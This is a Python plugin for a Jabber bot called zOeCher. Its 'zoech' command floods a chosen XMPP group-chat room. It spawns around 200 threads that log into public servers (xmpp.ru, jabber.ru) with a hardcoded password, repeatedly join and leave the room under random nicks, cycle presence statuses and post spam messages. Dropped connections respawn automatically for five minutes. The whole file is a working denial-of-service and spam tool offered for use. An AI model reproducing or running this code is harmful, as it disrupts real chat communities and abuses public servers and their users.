# zoecher 6.x plugin
# -*- coding: utf-8 -*-
#####################################################################
# This file is part of zOeCher 6.x
# Plugin 4 zOeCher Jabber Bot
# Coded By Silent.Hell (admin@smz.im)
# Official site: http://smz.im
# All Rights Reserved, Copyright © 2o13
#####################################################################

import os, xmpp, time, sys, time, pdb, urllib, threading, types, random
VIPE = {}
ONVIPE = []
REP_OTAKE={'n':0,'err':0,'thr':0}
GET_NI=[]
GEN_NI=[]
vers = {'botver': {'name': 'zOeCher Child', 'ver': 'v5.x', 'os': '{Şαŋτα•τєαм™ 2ờ1ờ-2ờ13 ©}'}}
statusx = ['zOeCher!','zOeCher Child','Şαŋτα™']
showx = ['dnd','xa','away','online','chat']
prshanger = 0
servers = ['xmpp.ru','jabber.ru']
messages = ['HI\n\nI\'m zOeCher Child\n\n*NO**NO**NO**NO**NO*','.','I\'m zOeCher Child\'s My Name zoo-'+str(random.randrange(00, 1000))]
def hanger_join(cl, groupchat):
  nick = '|SM|['+str(random.randrange(00, 1000))+u']'
  GEN_NI.append(groupchat+'/'+nick)
  prs=xmpp.protocol.Presence(groupchat+'/'+nick)
  prs.setStatus(random.choice(statusx))
  prs.setShow(random.choice(showx))
  prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
  try:
    cl.send(prs)
  except:
    pass

def prshanger_timer(type,source,parameters):
  global prshanger
  time.sleep(300)
  if prshanger:
    prshanger = 0
    reply(type, source, u'Finished!')

def prshanger_thread(p):
  if len(p)>10:
    if p[0] in [101] and p[6] in [49]:
      return True
  return False
		      
def prshanger_start(type,source,parameters):
  global prshanger
  if parameters:
    if not parameters.count('@'):
      reply(type, source, u'Wrong command.')
      return
    body = parameters.split()
    if parameters.count(u'santa'):
      reply(type, source, u'Wrong room.')
      return
    conf = body[0].lower()
    prshanger = 1
    reply(type,source,u'Ok')
    threading.Thread(None, prshanger_timer, 'prshanger_timer'+str(random.randrange(0, 999)), (type,source,parameters)).start()
    for x in range(0, 200):
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), (type,source,conf)).start()           
		
def prshanger_auth(type,source,conf):
  if not prshanger:
    return
  try:
    server = random.choice(servers)
    name, domain, password, newBotJid, mainRes = 'zOeCher['+str(random.randrange(00, 100))+']', server, 'iam.syrian', 0, 'SM'
    node = unicode(name)
    lastnick = name
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    print u'New jid: '+unicode(jid)
    psw = u''
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con = cl.connect()
    print u'Connected'
    au=cl.auth(jid.getNode(), password, jid.getResource())
    print u'Autheticated'
    cl.sendInitPresence()
    cl.RegisterHandler('iq',version)
    cl.RegisterHandler('message',message)
    if cl.isConnected():
      threading.Thread(None, hanger_change_nicks, 'hanger_change_nicks'+str(random.randrange(0, 999)), (cl,conf)).start()
      threading.Thread(None, hanger_change_prs, 'hanger_change_prs'+str(random.randrange(0, 999)), (cl,conf)).start()
      threading.Thread(None, hanger_message, 'hanger_message'+str(random.randrange(0, 999)), (cl,conf)).start()
    else:
      threading.Thread(None, prshanger_auth, 'prshanger_auth', (type,source,conf)).start()
      return
  except:
    pass

def version(cl,iq):
	fromjid = iq.getFrom()
	global vers
	if not iq.getType() == 'error':
		if iq.getTags('query', {}, xmpp.NS_VERSION):
			if not vers['botver']['os']:
				osver=''
				if os.name=='nt':
					osname=os.popen("ver")
					osver=osname.read().strip().decode('utf8')+'\n'
					osname.close()			
				else:
					osname=os.popen("uname -sr", 'r')
					osver=osname.read().strip()+'\n'
					osname.close()			
				pyver = ''
				vers['botver']['os'] = pyver
			result = iq.buildReply('result')
			query = result.getTag('query')
			query.setTagData('name', 'zOeCher Child')
			query.setTagData('version', '5.x')
			query.setTagData('os', '{Şαŋτα•τєαм™ 2ờ1ờ-2ờ13 ©}')
			try:
                          cl.send(result)
                        except:
                          pass


def hanger_change_prs(cl, conf):
  prs=xmpp.protocol.Presence()
  prs.setShow(random.choice(showx))
  prs.setStatus(random.choice(statusx))
  while prshanger and cl.isConnected():
    hanger_join(cl, conf)
    time.sleep(0)
    prs.setShow(random.choice(showx))
    prs.setStatus(random.choice(statusx))
    time.sleep(0)
    hanger_leave(cl,conf)
    time.sleep(0)
    hanger_join(cl,conf)
    time.sleep(0)
    prs.setShow(random.choice(showx))
    prs.setStatus(random.choice(statusx))
  if prshanger:
    try:
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass



def hanger_message(cl,conf):
  z=0
  hanger_join(cl,conf)
  z+=1
  time.sleep(0)
  try:
    for x in range(0, 200):
      text = random.choice(messages)
      omsg = xmpp.protocol.Message(conf, text, 'groupchat')
      cl.send(omsg)
      hanger_leave(cl,conf)
  except:
    pass
  if prshanger:
    try:
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def message(cl,msg):
  pass

def hanger_leave(cl,groupchat,status='*BYE*'):
  prs=xmpp.Presence(groupchat, 'unavailable')
  try:
    cl.send(prs)
  except:
    pass
  
def hanger_change_nicks(cl, conf):
  z=0
  while prshanger and cl.isConnected():
    hanger_join(cl, conf)
    time.sleep(0)
    z+=1
  if prshanger:
    try:
      threading.Thread(None, prshanger_auth, 'prshanger_auth'+str(random.randrange(0, 999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def prshanger_stop(type, source, parameters):
  global prshanger
  if prshanger:
    prshanger = 0
    reply(type,source,u'Stopped')
    return
  else:
    reply(type,source,u'Not Active')

register(prshanger_start, Prefix+'zoech', 9)
register(prshanger_stop, Prefix+'stop_zoech', 9)
#########################################################################################

